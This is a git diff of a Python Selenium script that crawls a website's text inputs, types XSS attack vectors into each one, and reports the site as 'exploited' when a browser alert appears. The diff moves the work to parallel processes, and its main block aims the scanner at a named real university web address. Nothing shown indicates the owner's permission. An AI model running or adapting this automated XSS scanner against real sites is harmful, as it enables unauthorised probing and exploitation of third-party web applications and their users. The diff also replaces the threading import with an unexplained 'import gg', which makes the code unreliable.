@@ -1,5 +1,5 @@
 from selenium import webdriver
-import threading
+import gg
 from selenium.webdriver.common.keys import Keys
 import pandas as pd
 import matplotlib.pyplot as plt
@@ -10,6 +10,8 @@ import networkx as nx
 from os import getcwd
 import sys
 import os
+from multiprocessing import Process, current_process
+import traceback
 
 def chunks_n(lista , n):
     chunk_size = int(len(lista)/n)
@@ -46,7 +48,7 @@ def get_all_xss_attacks():
 
 def test_vector_xss( xpath_input_object , attack_vector):
 
-    print(f"starting thread # {threading.current_thread().getName()}")
+    print(f"starting thread # {current_process().name}")
     driver = webdriver.Chrome()
     url  = xpath_input_object['url']
     xpath = xpath_input_object["xpath"]
@@ -54,7 +56,7 @@ def test_vector_xss( xpath_input_object , attack_vector):
     sleep(3)
     for i in attack_vector:
         try:
-            #print(f"\n testing {i} at {xpath} in {url} at thread #{threading.current_thread().getName()}")
+            #print(f"\n testing {i} at {xpath} in {url} at thread #{current_process().name}")
             driver.get(url)
             sleep(1)
             element = driver.find_element_by_xpath(xpath)
@@ -64,23 +66,31 @@ def test_vector_xss( xpath_input_object , attack_vector):
             if(is_alerted(driver)):
                 #it means it was exploited
                 print(f"{url} exploited in  {xpath} with {i}")
+
+        except KeyboardInterrupt:
+            print("Exiting, Could perform some seconds")
+            exit(0)
         except:
             print(f"error exploiting {i} in {xpath} at {url}")
+
     driver.close()
-    print(f"thread #{threading.current_thread().getName()} done")
+    #print(f"thread #{threading.current_thread().getName()} done")
 
 def parallel_test_vector_xss(xpath_input_object , attack_vector , n_threads):
     chunks = chunks_n(attack_vector , n_threads)
     threads = []
     for i in range(0 , len(chunks)):
-        t = threading.Thread(target = test_vector_xss, args = (xpath_input_object , chunks[i] ,) , name = f"{i}")
+        t = Process(target = test_vector_xss, args = (xpath_input_object , chunks[i] ,) , name = f"{i}")
         t.start()
         threads.append(t)
 
     #si no hago esto paralelizo todo muy duro y abro como 10.000 browsers
-    for i in threads:
-        i.join()
-
+    try:
+        for i in threads:
+            i.join()
+    except:
+        print("saliendo del multithread")
+        sys.exit(0)
 # Function that given a tag (html portion of code), returns true if it is a text type input, with a minimum
 # of characters allowed, it is because our algorithm writtes literally on the input and attack vectors most are of length > 10
 def check_length_input(tag):
@@ -238,17 +248,17 @@ def get_xpaths_inputs_recursiveley(driver , root_url , depth):
             pass
     return(all_xpaths)
 
+if __name__ == "__main__":
+    chromeOptions = webdriver.ChromeOptions()
+    prefs = {"download.default_directory" : "".join([getcwd(), "\Downloads"])}
+    print("".join([getcwd(), "\Downloads"]))
+    chromeOptions.add_experimental_option("prefs",prefs)
+    driver = webdriver.Chrome(chrome_options = chromeOptions)
 
-chromeOptions = webdriver.ChromeOptions()
-prefs = {"download.default_directory" : "".join([getcwd(), "\Downloads"])}
-print("".join([getcwd(), "\Downloads"]))
-chromeOptions.add_experimental_option("prefs",prefs)
-driver = webdriver.Chrome(chrome_options = chromeOptions)
+    goal = get_xpaths_inputs_recursiveley(driver , "https://tmedweb.tulane.edu/content_open" , 2)
+    xss_vectors = get_all_xss_attacks()
+    driver.close()
+    for i in goal:
+        parallel_test_vector_xss( i , xss_vectors , 4)
 
-goal = get_xpaths_inputs_recursiveley(driver , "https://tmedweb.tulane.edu/content_open" , 1)
-xss_vectors = get_all_xss_attacks()
-driver.close()
-for i in goal:
-    parallel_test_vector_xss( i , xss_vectors , 4)
-
-print(goal)
+    print(goal)
